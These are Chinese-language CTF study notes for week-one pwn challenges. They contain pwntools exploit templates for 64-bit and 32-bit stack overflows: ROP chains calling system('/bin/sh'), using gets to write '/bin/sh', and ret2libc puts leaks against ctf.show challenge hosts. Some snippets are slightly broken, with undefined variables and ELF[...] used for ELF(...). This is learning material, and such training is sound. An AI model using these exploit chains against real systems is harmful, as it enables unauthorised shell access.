第一周pwn2

1，payload = b’a’*(0xA+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
2，无binsh时sh也可代替
3，有system无binsh时可以选择写入binsh，用gdb调试来查看可读可写的参数。来利用写入函数来改写参数的值，即
payload = b’a’*offset + p32(gets_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)
p.sendline(payload)
p.sendline(“/bin/sh”)
4，这是64位完整的exp
from pwn import *

padding = 0xA + 8

io = remote(“pwn.challenge.ctf.show”,28294)

system = 0x400520

gets = 0x400530

binsh = 0x603000 - 16

rdi = 0x4007f3
ret = 0x4004fe
payload = b’a’*padding
payload += p64(rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(gets)
payload += p64(rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
io.recv()
io.sendline(payload)
io.sendline(“/bin/sh”)

io.interactive()
照着这个格式来写就行。中间的binsh的位置要要用gdb来找，然后输入vmmap找本地的可读可写的参数就行了再减16.

第一周pwn1

1，找数据发送节点；
2，找plt表。直接去plt.sec区去找。
3，找libc表，这个要注意到底got表是哪个函数（这个和后面输出的地址有关），再去查。real_addr = u64(p.recvuntil(‘\x7f’)[-6:].ljust(8, b’\x00’))根据这个都后三位来查。
4，构造输入payload，一般是两个。
5.32位的libc地址
exp的例子，具体可以套。
from pwn import *

padding = 0x6B + 4
elf = ELF(“./pwn”)
io = remote(“pwn.challenge.ctf.show”,28139)
puts_plt = elf.plt[‘puts’]
libc = ELF[“./libc6_2.40-4ubuntu1_i386.so”]
puts_got = elf.got[‘puts’]

main = 0x804866D

payload = b’a’*padding + p32(puts_plt) + p32(main) + p32(puts_got)

puts_real_addr = u32(io.recv()[0:4])
print(hex(puts_real_addr))

6，64位找libc地址
from pwn import *

padding = 0x70 + 8
io = remote(“pwn.challenge.ctf.show”,28283)

elf = ELF(“./pwn”)
rdi = 0x400803
puts_plt = elf.plt[“puts”]
puts_got = elf.got[“puts”]
main = 0x40071D

payload = b’a’*padding + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.sendline(payload)
real_addr = u64(io.recvuntil(‘\x7f’)[-6:].ljust(8, b’\x00’))
print(hex(real_addr))
注意：’main’是参数输入的函数若是输入的参数再run函数中那就将齐地址放到后面。
之后的就是这样了
libc_base=puts_real-libc.dump(‘puts’)
bin_sh=libc_base+libc.dump(‘str_bin_sh’)
sys_addr=libc_base+libc.dump(‘system’)

payload = pad + p64(ret_addr)+ p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)
p.sendline(payload)
p.interactive()
7，32位和64位的最大不同就在于是否用寄存器传参。
